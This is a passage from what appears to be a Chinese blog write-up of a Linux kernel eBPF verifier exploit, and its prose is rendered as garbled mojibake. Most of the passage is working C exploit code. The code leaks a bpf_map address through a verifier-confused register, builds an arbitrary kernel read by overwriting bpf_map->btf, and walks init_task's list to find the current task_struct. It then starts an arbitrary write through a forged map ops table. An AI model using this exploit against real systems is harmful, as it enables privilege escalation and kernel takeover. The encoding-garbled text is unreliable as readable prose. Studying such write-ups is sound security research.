tnum_unknown;<br>reg-&gt;frameno = <span class="hljs-number">0</span>;<br>reg-&gt;precise = env-&gt;subprog_cnt &gt; <span class="hljs-number">1</span> || !env-&gt;bpf_capable;<br>__mark_reg_unbounded(reg);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ç”±æ­¤æˆ‘ä»¬ä¾¿å¯ä»¥é€šè¿‡å°†æŒ‡é’ˆå¯„å­˜å™¨ä¸ä¸€ä¸ªæ¼æ´å¯„å­˜å™¨è¿›è¡Œç®—æœ¯è¿ç®—æ¥ç»•è¿‡è¿™ä¸ªé™åˆ¶ï¼Œä»è€Œæ³„éœ²å‡º map çš„åœ°å€ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯<strong>æˆ‘ä»¬çš„æ¼æ´å¯„å­˜å™¨çš„ç¬¬ 33 ä½æ˜¯ unknown çš„ï¼Œæˆ‘ä»¬éœ€è¦å°†å…¶è¿›è¡Œæˆªæ–­ä»¥æ¶ˆå»</strong>ï¼š</p><blockquote><p>æˆ‘ä»¬åº”å½“å°½é‡å‡å°‘æˆªæ–­æ—¶ verifier å¯¹å¯„å­˜å™¨çš„è·Ÿè¸ªï¼Œå› æ­¤è¿™é‡Œç›´æ¥ç”¨ <code>mov</code> ï¼Œå¦‚æœä½¿ç”¨ <code>and 0xffffffff</code> è¿™æ ·çš„æ“ä½œåˆ™æ²¡æ³•æ¶ˆé™¤æ‰ unknown ä½ï¼Œå°‘ and å‡ ä½åˆ™ä¼šå¯¼è‡´å¯„å­˜å™¨è¾¹ç•Œå€¼å’Œ var_off é‡æ–°æ›´æ–°</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> LEAK_MAP_ADDR(__map_fd)                         \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV32_REG(VULN_REG, VULN_REG),              \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_ADD, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(1, __map_fd, BPF_REG_8), \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0)</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">leak_map_addr</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        LEAK_MAP_ADDR(map_fd), <br>        BPF_EXIT_INSN()<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦æ³¨æ„æˆ‘ä»¬è·å¾—çš„åœ°å€æ˜¯æŒ‡å‘ <code>bpf_array.value</code> çš„ï¼Œéœ€è¦è‡ªè¡Œè®¡ç®—åç§»ï¼š</p><p><img src="https://s2.loli.net/2023/06/06/1KNx2MTmQ5A39Gp.png" alt="image.png"></p><blockquote><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ° <code>bpf_map</code> <strong>å¹¶ä¸åœ¨ direct mapping area ä¸Š</strong>ï¼Œåº”è¯¥æ˜¯è°ƒç”¨äº† vmallocï¼Œç¬”è€…æ¨æµ‹å¯èƒ½æ˜¯å› ä¸ºæˆ‘ä»¬åˆ†é…çš„ map å¤ªå¤§çš„ç¼˜æ•…ï¼šï¼‰</p></blockquote><h2 id="å››ã€ä»»æ„åœ°å€è¯»ï¼Œæ³„éœ²è¿›ç¨‹åœ°å€"><a href="#å››ã€ä»»æ„åœ°å€è¯»ï¼Œæ³„éœ²è¿›ç¨‹åœ°å€" class="headerlink" title="å››ã€ä»»æ„åœ°å€è¯»ï¼Œæ³„éœ²è¿›ç¨‹åœ°å€"></a>å››ã€ä»»æ„åœ°å€è¯»ï¼Œæ³„éœ²è¿›ç¨‹åœ°å€</h2><p>æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘å¦‚ä½•å®Œæˆä»»æ„åœ°å€è¯»ï¼Œç”±äºæˆ‘ä»¬èƒ½å¤Ÿè¯»å†™ <code>bpf_map</code> ä¸­çš„æ•°æ®ï¼Œæ•…è€ƒè™‘ä»æ­¤å¤„ä¸‹æ‰‹ï¼šï¼‰</p><p><strong>BPF Type Format</strong>ï¼ˆBTFï¼‰æ˜¯ä¸€ç§å…ƒæ•°æ®æ ¼å¼ï¼Œç”¨äºç»™ eBPF æä¾›ä¸€äº›é¢å¤–çš„ä¿¡æ¯ï¼Œåœ¨å†…æ ¸ä¸­ä½¿ç”¨ <code>btf</code> ç»“æ„ä½“è¡¨ç¤ºä¸€æ¡ btf ä¿¡æ¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf</span> &#123;</span><br><span class="hljs-type">void</span> *data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf_type</span> **<span class="hljs-title">types</span>;</span><br>u32 *resolved_ids;<br>u32 *resolved_sizes;<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *strings;<br><span class="hljs-type">void</span> *nohdr_data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf_header</span> <span class="hljs-title">hdr</span>;</span><br>u32 nr_types; <span class="hljs-comment">/* includes VOID for base BTF */</span><br>u32 types_size;<br>u32 data_size;<br><span class="hljs-type">refcount_t</span> refcnt;<br>u32 id;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span> <span class="hljs-title">rcu</span>;</span><br><br><span class="hljs-comment">/* split BTF support */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf</span> *<span class="hljs-title">base_btf</span>;</span><br>u32 start_id; <span class="hljs-comment">/* first type ID in this BTF (0 for base BTF) */</span><br>u32 start_str_off; <span class="hljs-comment">/* first string offset (0 for base BTF) */</span><br><span class="hljs-type">char</span> name[MODULE_NAME_LEN];<br><span class="hljs-type">bool</span> kernel_btf;<br>&#125;;<br></code></pre></td></tr></table></figure><p>æ³¨æ„åˆ°åœ¨ <code>bpf_map</code> å½“ä¸­åˆšå¥½æœ‰ä¸€ä¸ªæŒ‡å‘ <code>struct btf</code> çš„æŒ‡é’ˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> &#123;</span><br><span class="hljs-comment">//...</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf</span> *<span class="hljs-title">btf</span>;</span><br></code></pre></td></tr></table></figure><p> <code>bpf_map-&gt;btf</code> åœ¨ä»€ä¹ˆæ—¶å€™ä¼šè¢«è®¿é—®åˆ°ï¼Ÿæ³¨æ„åˆ° <code>bpf</code> ç³»ç»Ÿè°ƒç”¨ç»™æˆ‘ä»¬æä¾›çš„é€‰é¡¹ä¸­æœ‰ä¸€ä¸ªä¸º <code>BPF_OBJ_GET_INFO_BY_FD</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE3(bpf, <span class="hljs-type">int</span>, cmd, <span class="hljs-keyword">union</span> bpf_attr __user *, uattr, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, size)<br>&#123;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">case</span> BPF_OBJ_GET_INFO_BY_FD:<br>err = bpf_obj_get_info_by_fd(&amp;attr, uattr);<br><span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p>å¯¹äº map ç±»å‹è€Œè¨€æœ€ç»ˆä¼šè°ƒç”¨åˆ° <code>bpf_map_get_info_by_fd()</code> ï¼Œåœ¨è¯¥å‡½æ•°ä¸­<strong>ä¼šæŠŠ bpf_map-&gt;btf.id æ‹·è´ç»™ç”¨æˆ·ç©ºé—´</strong>ï¼š </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bpf_map_get_info_by_fd</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file,</span><br><span class="hljs-params">  <span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>,</span><br><span class="hljs-params">  <span class="hljs-type">const</span> <span class="hljs-keyword">union</span> bpf_attr *attr,</span><br><span class="hljs-params">  <span class="hljs-keyword">union</span> bpf_attr __user *uattr)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">map</span>-&gt;btf) &#123;<br>info.btf_id = btf_obj_id(<span class="hljs-built_in">map</span>-&gt;btf);<br>info.btf_key_type_id = <span class="hljs-built_in">map</span>-&gt;btf_key_type_id;<br>info.btf_value_type_id = <span class="hljs-built_in">map</span>-&gt;btf_value_type_id;<br>&#125;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">if</span> (copy_to_user(uinfo, &amp;info, info_len) ||<br>    put_user(info_len, &amp;uattr-&gt;info.info_len))<br><span class="hljs-keyword">return</span> -EFAULT;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bpf_obj_get_info_by_fd</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">union</span> bpf_attr *attr,</span><br><span class="hljs-params">  <span class="hljs-keyword">union</span> bpf_attr __user *uattr)</span><br>&#123;<br><span class="hljs-type">int</span> ufd = attr-&gt;info.bpf_fd;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd</span> <span class="hljs-title">f</span>;</span><br><span class="hljs-type">int</span> err;<br><br><span class="hljs-keyword">if</span> (CHECK_ATTR(BPF_OBJ_GET_INFO_BY_FD))<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>f = fdget(ufd);<br><span class="hljs-keyword">if</span> (!f.file)<br><span class="hljs-keyword">return</span> -EBADFD;<br><br><span class="hljs-keyword">if</span> (f.file-&gt;f_op == &amp;bpf_prog_fops)<br>err = bpf_prog_get_info_by_fd(f.file, f.file-&gt;private_data, attr,<br>      uattr);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (f.file-&gt;f_op == &amp;bpf_map_fops)<br>err = bpf_map_get_info_by_fd(f.file, f.file-&gt;private_data, attr,<br>     uattr);<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯<strong>æˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶ btf æŒ‡é’ˆçš„æ–¹å¼å®Œæˆä»»æ„åœ°å€è¯»</strong>ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> READ_ARBITRARY_ADDR(__map_fd, __idx)            \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu-&gt;limit and do the oob read */</span> \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xd0),         \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* write the value into bpf_map-&gt;btf */</span>         \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(__idx, __map_fd, BPF_REG_8),     \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_8, 0),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, 0x58),        \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_1, 0)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">size_t</span> <span class="hljs-title function_">read_arbitrary_addr_4_bytes</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">int</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        MAKE_VULN_REG(map_fd),<br>        READ_ARBITRARY_ADDR(map_fd, idx), <br>        BPF_EXIT_INSN()<br>    &#125;;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_info</span> <span class="hljs-title">info</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .info.bpf_fd = map_fd,<br>        .info.info_len = <span class="hljs-keyword">sizeof</span>(info),<br>        .info.info = (<span class="hljs-type">uint64_t</span>) &amp;info,<br>    &#125;;<br>    <span class="hljs-type">size_t</span> data;<br>    <span class="hljs-type">int</span> ret;<br><br>    ret = run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(&amp;info, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(info));<br>    ret = bpf(BPF_OBJ_GET_INFO_BY_FD, &amp;attr);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    data = info.btf_id;<br><br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">read_arbitrary_addr</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">size_t</span> addr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> data;<br>    <span class="hljs-type">int</span> key;<br>    <span class="hljs-type">size_t</span> value[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Loading value into map...&quot;</span>);<br>    key = <span class="hljs-number">1</span>;<br>    value[<span class="hljs-number">0</span>] = addr;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to load value into map!&quot;</span>);<br>    &#125;<br>    key = <span class="hljs-number">2</span>;<br>    value[<span class="hljs-number">0</span>] = addr + <span class="hljs-number">4</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to load value into map!&quot;</span>);<br>    &#125;<br><br>    data = read_arbitrary_addr_4_bytes(map_fd, <span class="hljs-number">2</span>);<br>    data &lt;&lt;= <span class="hljs-number">32</span>;<br>    data += read_arbitrary_addr_4_bytes(map_fd, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸è¿‡ç”±äºæˆ‘ä»¬ç›®å‰æš‚æ—¶ä¸çŸ¥é“ <code>page_offset_base</code> ï¼Œå› æ­¤æš‚æ—¶æ— æ³•å®Œæˆå¯¹æ‰€æœ‰ç‰©ç†å†…å­˜æœç´¢çš„å·¥ä½œï¼Œè€Œåªèƒ½è¯»å–å†…æ ¸é•œåƒèŒƒå›´çš„å†…å­˜</p><p>ä½†æ˜¯ <code>init</code> è¿›ç¨‹çš„ PCB <code>init_task</code> ä½äºå†…æ ¸æ•°æ®æ®µä¸Šï¼Œ<strong>init_task çš„åœ°å€å¯¹æˆ‘ä»¬æ¥è¯´æ˜¯å¯çŸ¥çš„</strong>ï¼Œè€Œ<strong>æ‰€æœ‰è¿›ç¨‹åœ¨å†…æ ¸ä¸­çš„ PCB æ„æˆä¸€ä¸ªåŒå‘é“¾è¡¨ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç›´æ¥æ²¿ç€è¿™ä¸ªåŒå‘é“¾è¡¨æœç´¢æˆ‘ä»¬çš„è¿›ç¨‹æ§åˆ¶å—</strong>ï¼Œåˆ¤æ–­æ˜¯å¦æœç´¢åˆ°çš„æ–¹æ³•æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚è¯´å¯¹æ¯” pid ä¸€ç±»çš„ï¼Œè¿™é‡Œç¬”è€…é€‰æ‹©ç”¨ <code>prctl(PR_SET_NAME, &quot;arttnba3&quot;)</code> æ¥è®¾ç½® <code>task_struct-&gt;comm</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> current_task;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">search_for_current_task</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> next_task = INIT_TASK + kernel_offset + <span class="hljs-number">0x818</span>;<br>    <span class="hljs-type">size_t</span> data;<br><br>    prctl(PR_SET_NAME, <span class="hljs-string">&quot;arttnba3&quot;</span>);<br><br>    <span class="hljs-keyword">do</span> &#123;<br>        next_task = read_arbitrary_addr(map_fd, next_task);<br>        data = read_arbitrary_addr(map_fd, next_task + <span class="hljs-number">0x2d0</span>);<br>    &#125; <span class="hljs-keyword">while</span> (data != *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>);<br><br>    current_task = next_task - <span class="hljs-number">0x818</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Get current task_struct&#x27;s addr: \033[0m%lx\n&quot;</span>,<br>           current_task);<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆåŠŸè·å¾—å½“å‰è¿›ç¨‹çš„ <code>task_struct</code> åœ°å€ï¼š</p><p><img src="https://s2.loli.net/2023/06/06/tVo6viTK8C53Y1F.png" alt="image.png"></p><h2 id="äº”ã€ä»»æ„åœ°å€å†™"><a href="#äº”ã€ä»»æ„åœ°å€å†™" class="headerlink" title="äº”ã€ä»»æ„åœ°å€å†™"></a>äº”ã€ä»»æ„åœ°å€å†™</h2><p>æˆ‘ä»¬åŒæ—¶æœ‰ map çš„åœ°å€å’Œå†…æ ¸åŸºå€ï¼ŒåŒæ—¶è¿˜èƒ½ç›´æ¥æ”¹å†™ map å†…éƒ¨çš„å†…å®¹ï¼Œä¸éš¾æƒ³åˆ°çš„æ˜¯æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨ map ä¸Šæ„é€  fake map ops ååŠ«æŒ map å‡½æ•°è¡¨ä»è€ŒåŠ«æŒå†…æ ¸æ§åˆ¶æµ</p><p>æ¯”è¾ƒä¼ ç»Ÿçš„æ–¹å¼å°±æ˜¯ç›´æ¥æ ˆè¿ç§»ç„¶å ROP æ‰§è¡Œ <code>commit_cred(&amp;init_cred)</code>ï¼Œä½†ç¬”è€…çœ‹åˆ°ä¸€ä¸ªéå¸¸æœ‰æ„æ€çš„æ„é€ ä»»æ„å†™çš„æ€è·¯ï¼Œæ‰€ä»¥è¿™é‡Œä¹Ÿç”¨è¿™ç§è§£æ³•ï¼ˆç¬‘ï¼‰</p><p>æ³¨æ„åˆ° array map çš„ <code>map_get_next_key()</code> å®šä¹‰å¦‚ä¸‹ï¼Œå½“ <code>key</code> å°äº <code>map.max_entries</code> æ—¶ <code>key</code> ä¼šè¢«å†™å…¥åˆ° <code>next_key</code> å½“ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Called from syscall */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">array_map_get_next_key</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>, <span class="hljs-type">void</span> *key, <span class="hljs-type">void</span> *next_key)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_array</span> *<span class="hljs-title">array</span> =</span> container_of(<span class="hljs-built_in">map</span>, <span class="hljs-keyword">struct</span> bpf_array, <span class="hljs-built_in">map</span>);<br>u32 index = key ? *(u32 *)key : U32_MAX;<br>u32 *next = (u32 *)next_key;<br><br><span class="hljs-keyword">if</span> (index &gt;= <span class="hljs-built_in">array</span>-&gt;<span class="hljs-built_in">map</span>.max_entries) &#123;<br>*next = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (index == <span class="hljs-built_in">array</span>-&gt;<span class="hljs-built_in">map</span>.max_entries - <span class="hljs-number">1</span>)<br><span class="hljs-keyword">return</span> -ENOENT;<br><br>*next = index + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å½“ç„¶å¯¹äºå¸¸è§„çš„è°ƒç”¨ <code>map_get_next_key()</code> çš„æµç¨‹è€Œè¨€è™½ç„¶ <code>key</code> çš„å†…å®¹æ˜¯å¯æ§çš„ä½†æ˜¯ <code>next_key</code> æŒ‡é’ˆä¸æ˜¯æˆ‘ä»¬æ‰€èƒ½æ§åˆ¶çš„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">map_get_next_key</span><span class="hljs-params">(<span class="hljs-keyword">union</span> bpf_attr *attr)</span><br>&#123;<br><span class="hljs-comment">//...</span><br>next_key = kmalloc(<span class="hljs-built_in">map</span>-&gt;key_size, GFP_USER);<br><span class="hljs-comment">//...</span><br><br>rcu_read_lock();<br>err = <span class="hljs-built_in">map</span>-&gt;ops-&gt;map_get_next_key(<span class="hljs-built_in">map</span>, key, next_key);<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯åœ¨ map ops å½“ä¸­æœ‰ä¸€äº›å‡½æ•°å¯ä»¥è®©æˆ‘ä»¬æ§åˆ¶è¿™ä¸¤ä¸ªå‚æ•°ï¼Œ<strong>æˆ‘ä»¬å¯ä»¥å°†è¿™æ ·çš„å‡½æ•°æŒ‡é’ˆæ›¿æ¢ä¸º</strong>  <code>map_get_next_key()</code> <strong>ä»è€Œå®Œæˆä»»æ„åœ°å€å†™</strong>ï¼Œä¾‹å¦‚ <code>map_push_elem()</code> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_ops</span> &#123;</span><br><span class="hljs-comment">//...</span><br><span class="hljs-type">int</span> (*map_push_elem)(<span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>, <span class="hljs-type">void</span> *value, u64 flags);<br></code></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬æ›´æ–° eBPF map æ—¶ï¼Œè‹¥ map ç±»å‹ä¸º <code>BPF_MAP_TYPE_QUEUE</code> æˆ– <code>BPF_MAP_TYPE_STACK</code> ï¼Œåˆ™è¿™ä¸ªå‡½æ•°ä¼šè¢«è°ƒç”¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 